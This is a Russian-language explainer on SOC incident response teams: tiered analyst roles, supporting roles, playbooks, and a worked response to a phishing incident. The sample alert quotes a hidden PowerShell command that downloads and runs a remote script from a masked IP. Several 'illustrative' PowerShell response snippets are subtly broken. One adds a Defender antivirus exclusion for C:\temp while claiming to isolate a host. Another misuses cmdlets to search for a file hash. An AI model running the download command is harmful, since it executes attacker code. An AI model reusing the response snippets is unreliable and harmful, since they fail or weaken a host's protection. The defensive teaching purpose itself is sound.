# Команда реагирования на инциденты в SOC

## Контекст и базовые понятия: место команды реагирования в SOC и в Blue Team

Security Operations Center (SOC) — централизованное подразделение, которое круглосуточно отслеживает, обнаруживает и останавливает киберугрозы в ИТ-инфраструктуре организации [Splunk]. Команда реагирования на инциденты (Incident Response Team, IR Team) — ключевая боевая единица SOC, непосредственно выполняющая обнаружение, анализ, сдерживание и ликвидацию инцидентов безопасности. В отличие от более широкого понятия Blue Team, которое охватывает любые защитные функции (управление уязвимостями, контроль конфигураций, форензику, разработку правил детектирования), IR-команда сфокусирована именно на оперативном цикле «обнаружил → проанализировал → среагировал».

Часто возникает путаница между смежными ролями, поэтому важно чётко разграничить зоны ответственности. Ниже сравнительная таблица отражает разницу между участниками SOC и смежными защитными функциями.

| Роль / Функция | Основная задача | Характер работы | Фокус во времени | Отличие от IR-аналитика |
|----------------|-----------------|----------------|-------------------|---------------------------|
| SOC Analyst (L1/L2/L3) | Обнаружение и реагирование на инциденты в реальном времени | Оперативный, посменный | Настоящее (активные атаки) | Непосредственно входит в команду реагирования |
| Incident Responder (IR) | Полный цикл расследования серьёзных инцидентов, координация восстановления | Тактический, проектный | Настоящее + ближайшее прошлое | В небольших SOC эту роль выполняют L2/L3 аналитики; в крупных IR-специалист может быть выделен для сложных кейсов |
| Threat Intelligence Analyst | Сбор, анализ и распространение данных об угрозах (IoC, TTP) | Стратегический, исследовательский | Будущее (проактивная подготовка) | Непосредственно не реагирует на алерты, а обогащает команду контекстом |
| Digital Forensics Analyst | Глубокий анализ артефактов после инцидента, сбор доказательств | Ретроспективный, углублённый | Прошлое (пост-инцидент) | Работает после завершения активной фазы; может привлекаться L3 для углублённого разбора |
| SOC Engineer | Развёртывание и настройка средств мониторинга (SIEM, EDR), интеграция логов | Инженерный, проектный | Постоянное улучшение инфраструктуры | Не обрабатывает алерты, но обеспечивает, чтобы алерты появлялись и были качественными |
| Penetration Tester (Red Team) | Имитация атак для проверки защищённости | Проектный, атакующий | Проверка текущего уровня защиты | Действует с внешней позиции, не участвует в ежедневной защите |

Команда реагирования SOC обычно выстраивается по многоуровневой модели, унаследованной из практик ИТ-поддержки и адаптированной под высокую цену ошибки в кибербезопасности. Такая иерархия позволяет фильтровать поток алертов: первая линия отсеивает ложные срабатывания и обрабатывает простые инциденты, вторая – проводит углублённое расследование, третья – ищет сложные угрозы и совершенствует детектирование. В российских реалиях наличие такой команды становится фактически обязательным не только из-за рыночных ожиданий, но и в силу требований регуляторов к непрерывному мониторингу и реагированию [Codeby.net].

Таким образом, IR-команда SOC — это не просто набор аналитиков, а иерархически организованная структура, где каждый уровень выполняет строго определённые задачи, а успех всего подразделения зависит от отлаженного взаимодействия между уровнями и поддерживающими ролями инженеров и менеджеров.

## Внутреннее устройство: иерархия и роли в команде реагирования

Команда реагирования на инциденты в SOC организована по принципу конвейера, где алерт проходит путь от первичного контакта до полного разрешения либо проактивного выявления скрытых угроз. Базовая модель включает три уровня аналитиков (Tier 1, Tier 2, Tier 3), которые дополняются инженерными и управленческими ролями, гарантирующими бесперебойную работу процессов, инструментов и качество реагирования.

```text
[Источники логов: сеть, конечные точки, облака, приложения]
            │
            ▼
      ┌───────────┐
      │  SIEM /    │
      │  EDR / XDR │
      └─────┬─────┘
            │ алерты
            ▼
┌────────────────────────────────────────────┐
│               Tier 1 (L1)                  │
│  ┌─────────────────────────────────────┐   │
│  │ Первичный триаж, классификация,     │   │
│  │ фильтрация ложных срабатываний,     │   │
│  │ выполнение плейбуков, эскалация     │   │
│  └─────────────────────────────────────┘   │
└────────────────────┬───────────────────────┘
                     │ подтверждённый инцидент
                     ▼
┌────────────────────────────────────────────┐
│               Tier 2 (L2)                  │
│  ┌─────────────────────────────────────┐   │
│  │ Глубокий анализ, определение TTP,   │   │
│  │ сдерживание, восстановление,         │   │
│  │ разработка правил детектирования     │   │
│  └─────────────────────────────────────┘   │
└────────────────────┬───────────────────────┘
                     │ сложный / неизвестный вектор
                     ▼
┌────────────────────────────────────────────┐
│               Tier 3 (L3)                  │
│  ┌─────────────────────────────────────┐   │
│  │ Проактивный поиск угроз (threat     │   │
│  │ hunting), реверс-инжиниринг ВПО,    │   │
│  │ стратегические улучшения защиты     │   │
│  └─────────────────────────────────────┘   │
└────────────────────────────────────────────┘
        │                        │
        ▼                        ▼
 ┌──────────────┐       ┌────────────────┐
 │ SOC Engineer │       │ IR Manager /   │
 │ (инструменты,│       │ Team Lead      │
 │  интеграция) │       │ (координация,  │
 └──────────────┘       │  SLA, эскалация│
                        └────────────────┘
```

*Иллюстративная схема потоков эскалации и поддерживающих ролей.*

**Tier 1 — аналитик первой линии (First Response).** Это входная точка в профессию для большинства специалистов SOC [ibcourses.ru, SOC Tier 1,2,3]. Аналитик L1 в реальном времени отслеживает консоль SIEM, принимает поток алертов (от сотен до тысяч в смену) и проводит триаж — быстро определяет, является ли событие ложным срабатыванием, требует ли немедленного реагирования или может быть отложено. Основные задачи: первичная классификация инцидента по категориям (фишинг, вредоносное ПО, brute force, аномалия трафика), сбор базового контекста (IP-адреса источника и назначения, временные метки, вовлечённые хосты и учётные записи), выполнение стандартных операционных процедур (playbook) — например, блокировка IP на межсетевом экране, сброс сессии пользователя, изоляция хоста в EDR. Если инцидент подтверждается и выходит за пределы компетенций L1, аналитик формирует тикет с полным описанием и передаёт его на уровень L2 [Coursera]. Ключевое качество L1 — способность быстро принимать решения в условиях высокой неопределённости, не углубляясь в расследование. Для этого достаточно уверенного знания сетевых протоколов (TCP/IP, DNS, HTTP/HTTPS), основ Windows и Linux, умения читать логи и работать с интерфейсом SIEM [Radiant Security].

**Tier 2 — аналитик-расследователь (Investigation and Response).** Аналитик L2 получает эскалированные инциденты и проводит полноценное расследование: восстанавливает цепочку атаки (Kill Chain), определяет тактики и техники злоумышленника по матрице MITRE ATT&CK, оценивает масштаб компрометации. Он также выполняет активное сдерживание — изолирует скомпрометированные системы, блокирует индикаторы компрометации на средствах защиты, запускает процессы восстановления (например, сброс паролей, очистка реестра). Кроме реактивных задач, L2 участвует в проактивной работе: пишет и тюнингует правила детектирования в SIEM, создаёт YARA-сигнатуры для выявления вредоносного ПО, разрабатывает новые плейбуки. Эта роль требует опыта от 2 лет, глубоких знаний в области анализа трафика, форензики конечных точек, scripting (Python, PowerShell) [ibcourses.ru]. В небольших SOC L2 может также выполнять функции Threat Intelligence Analyst, обогащая расследования внешними данными.

**Tier 3 — эксперт по поиску угроз (Threat Hunting and Prevention).** Аналитик L3 — наиболее опытный член команды, который не ждёт алертов, а активно ищет скрытые угрозы, пропущенные автоматическими средствами. Он формулирует гипотезы на основе данных threat intelligence, анализирует большие массивы телеметрии (сетевые потоки, логи DNS, события процессов), применяет методы статистического анализа и машинного обучения. В случае обнаружения новой угрозы L3 проводит реверс-инжиниринг вредоносного ПО, извлекает индикаторы и разрабатывает новые методы обнаружения. Его задача — постоянно повышать устойчивость всей команды, оставляя после себя улучшенные правила, скрипты, дашборды [Coursera]. В некоторых структурах Tier 3 отвечает за полный цикл форензики сложных инцидентов или взаимодействует с внешними IR-консультантами.

**Поддерживающие роли.** Без них работа аналитиков быстро превратилась бы в хаос. *SOC Engineer* (иногда выделяется в отдельную вертикаль) отвечает за развёртывание и настройку средств мониторинга: SIEM (Splunk, Microsoft Sentinel, MaxPatrol SIEM), EDR/XDR, IDS/IPS, песочниц. Он интегрирует новые источники логов, нормализует данные, управляет жизненным циклом правил корреляции и борется с ложными срабатываниями [Medium]. *Incident Response Manager (или Team Lead)* координирует действия аналитиков в смене, обеспечивает соблюдение SLA по времени реакции и разрешения инцидентов, выступает эскалационной точкой для критических инцидентов и коммуницирует с руководством компании [Cynet]. В крупных SOC также может присутствовать выделенный Threat Intelligence Analyst, снабжающий команду актуальными IoC и контекстом.

Таким образом, команда реагирования представляет собой четко стратифицированную экосистему, где каждый уровень выполняет свою часть общей миссии — минимизировать ущерб от кибератак и сократить время пребывания злоумышленника в сети.

## Применение и работа: процессы, инструменты и типовые операции

Ежедневная деятельность команды реагирования опирается на три кита: процессы (формализованные процедуры), люди (аналитики с необходимыми навыками) и технологии (платформы мониторинга и автоматизации). Рассмотрим, как эти компоненты взаимодействуют на практике.

**Рабочее место аналитика L1.** В начале смены аналитик открывает консоль SIEM, где уже настроены дашборды и очереди алертов, приоритизированные по критичности. При появлении нового алерта он выполняет стандартную последовательность: идентифицировать правило, вызвавшее срабатывание; собрать первичный контекст через обогащение (IP-репутация, данные об учётной записи, геолокация); сопоставить с текущими плейбуками. Большинство операций выполняется через SIEM, но часто требуется точечное обращение к EDR для проверки процессов на конечной точке или к сетевому анализатору для захвата пакетов.

Пример: алерт на подозрительный PowerShell-процесс. L1 выполняет в SIEM поисковый запрос, чтобы получить детали.

```splunk
index=windows sourcetype=WinEventLog:Security EventCode=4688
| search New_Process_Name="*powershell*" AND NOT Parent_CommandLine="*C:\\Windows\\System32*"
| table _time, host, User, CommandLine, Parent_CommandLine
| sort - _time
```

Этот запрос (иллюстративная схема) ищет события создания процессов, где PowerShell запущен не из системной директории, что может указывать на вредоносную активность. Вывод покажет время, хост, пользователя, полную командную строку и процесс-родитель. На основе результатов аналитик принимает решение: если командная строка содержит обфускацию или скачивание файла — эскалация.

**Плейбуки и стандартные операционные процедуры (SOP).** Для типовых инцидентов разрабатываются плейбуки — пошаговые инструкции, сводящие к минимуму вариативность и ошибки. Например, плейбук для фишинга: проверить заголовки письма, извлечь вложения, отправить в песочницу, проверить, открыто ли вложение на конечной точке, при подтверждении – заблокировать отправителя, сбросить пароль пользователя, инициировать полное сканирование хоста. Плейбук может исполняться частично автоматически через SOAR-платформу, где L1 лишь подтверждает шаги.

**Документирование и тикетинг.** Каждое действие, от первичного триажа до закрытия инцидента, фиксируется в тикет-системе (Jira, ServiceNow, TheHive). Полнота документации — критический показатель зрелости SOC. Тикет содержит: идентификатор, временные метки, описание инцидента, перечень затронутых систем, выполненные действия, собранные артефакты (хеши, IP), статус. Именно на основании этих записей L2 продолжает расследование, а L3 выявляет системные проблемы.

**Аналитика L2: глубокое расследование.** Получив эскалированный тикет, аналитик L2 не начинает с нуля — он изучает собранный контекст и дополняет его. Типичные шаги: анализ сетевого трафика (из NetFlow или захвата пакетов) на предмет C2-соединений, разбор артефактов в песочнице, поиск индикаторов по базе threat intelligence, написание правила для SIEM или YARA-сигнатуры для предотвращения повторения. Например, для выявления вредоносного документа, использованного в фишинге, L2 может создать правило:

```yara
rule Malicious_Doc_Feb25 {
    meta:
        description = "Обнаружение вредоносного документа, использующего уязвимость Equation Editor"
        author = "SOC L2"
        date = "2025-02-20"
        hash = "иллюстративная_схема"
    strings:
        $eqn1 = "Equation.3" nocase
        $ole  = { D0 CF 11 E0 A1 B1 1A E1 }
    condition:
        $ole at 0 and $eqn1
}
```

*Иллюстративная схема YARA-правила; фактические сигнатуры зависят от конкретного вредоносного файла.*

Такое правило может быть загружено в систему сканирования или SIEM для поиска похожих файлов на дисках.

**Взаимодействие с инженерами.** Когда аналитик замечает, что правило SIEM дает много ложных срабатываний, он ставит задачу инженеру на тюнинг: изменить пороговые значения, добавить исключения. Инженер, в свою очередь, проверяет корректность логирования источников, чтобы инциденты не терялись.

**Типичные ошибки и подводные камни.** Начинающие аналитики L1 склонны либо эскалировать всё подряд («на всякий случай»), перегружая L2, либо, наоборот, пытаться расследовать сложный инцидент самостоятельно, теряя драгоценное время. Зрелый процесс триажа опирается на четкие критерии эскалации, зафиксированные в SOP. Другая распространённая проблема – неверно настроенные правила корреляции, генерирующие «алертную усталость». Поэтому регулярный аудит правил и обратная связь от аналитиков к инженерам обязательны.

## Сквозной практический пример: реагирование на фишинговый инцидент

**Исходные условия.** Коммерческая организация использует SOC с SIEM на базе Splunk, EDR Microsoft Defender for Endpoint, песочницу для анализа файлов и тикет-систему. Команда работает в три уровня. Инцидент: пользователь получил фишинговое письмо с вложением «Invoice.docx», открыл его, инициировав загрузку вредоносного макроса.

**Шаг 1. Первичный алерт и триаж L1.**  
Аналитик L1 видит срабатывание правила SIEM: «Подозрительная активность Microsoft Office с загрузкой PowerShell». В консоль приходит алерт в формате JSON:

```json
{
  "alert_id": "67a1b3c4-...",
  "rule_name": "Office Macro Spawns PowerShell",
  "severity": "high",
  "timestamp": "2026-01-11T08:15:32Z",
  "source": {
    "hostname": "ws-fin05",
    "username": "ivanov.ivan",
    "ip": "10.0.3.45"
  },
  "event": {
    "parent_process": "WINWORD.EXE",
    "process": "powershell.exe",
    "command_line": "powershell -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('hxxp://103.15.xx.xx/payload.ps1')\"",
    "file_name": "Invoice.docx"
  },
  "indicators": {
    "destination_ip": "103.15.xx.xx",
    "file_hash_md5": "d41d8cd98f00b204e9800998ecf8427e"
  }
}
```

*Иллюстративная схема JSON-алерта; значения IP и хеша заменены.*

L1 проверяет IP-адрес по Threat Intelligence — он помечен как вредоносный. В EDR по хосту `ws-fin05` видны подозрительные сетевые соединения. Согласно плейбуку, аналитик немедленно изолирует хост через консоль Defender:

```powershell
# Подключение к API Defender (иллюстративная команда)
Connect-AzureAD
Set-MpPreference -ExclusionPath "C:\temp"
# Команда изоляции через API
Invoke-MpAction -ComputerName "ws-fin05" -Action Isolate
```

После изоляции L1 документирует все артефакты в тикете #INC-1201 и эскалирует на L2.

**Шаг 2. Расследование и сдерживание L2.**  
L2 получает тикет, анализирует артефакты. В песочнице подтверждено, что `Invoice.docx` эксплуатирует CVE-2017-11882 (Equation Editor). L2 разрабатывает YARA-правило для поиска аналогичных файлов (см. выше) и загружает его в SIEM. Одновременно через консоль Defender он инициирует массовое сканирование всех рабочих станций на наличие индикатора:

```powershell
# Иллюстративный запрос к Defender API для поиска файлов с хешем
$hash = "d41d8cd98f00b204e9800998ecf8427e"
$results = Get-MpComputerStatus | Where-Object { $_.ThreatDetected -contains $hash }
```

Аналитик также блокирует IP `103.15.xx.xx` на межсетевом экране через централизованную консоль (в реальной среде это может быть команда типа `Add-NetFirewallRule` или обращение к API). Выясняется, что затронут только один хост, несанкционированного перемещения нет.

**Шаг 3. Восстановление и отчётность.**  
L2 координирует с системным администратором удаление вредоносного файла и сброс пароля пользователя `ivanov.ivan`. Все действия фиксируются в тикете, к которому прикрепляются логи SIEM, дампы трафика, скриншоты. В отчёте указывается дата обнаружения, вектор атаки, TTP (initial access via phishing, execution via PowerShell), сработавшие контроли, проведённое сдерживание и рекомендации.

**Шаг 4. Проактивные действия L3 (опционально).**  
На основе полученных данных L3 проводит ретроспективный поиск в SIEM за последние 30 дней:

```splunk
index=network dest_ip="103.15.xx.xx"
| stats count by src_ip, dest_port, _time
| where count > 5
```

*Поиск всех соединений с вредоносным IP за месяц.*  
Обнаружено, что с того же IP были попытки подключения к другим хостам, но они были заблокированы межсетевым экраном. L3 делает вывод о необходимости ужесточения правил исходящего фильтра и выпускает рекомендацию.

**Ожидаемый вывод примера.** Демонстрируется полный цикл работы команды реагирования: от автоматического обнаружения до ручного расследования и проактивного улучшения защиты. Чёткая уровневая структура позволила L1 быстро изолировать угрозу, L2 — провести глубокий анализ и предотвратить повторение, L3 — повысить общую защищённость. Инцидент был полностью локализован, а документирование обеспечило прозрачность и возможность обучения команды.
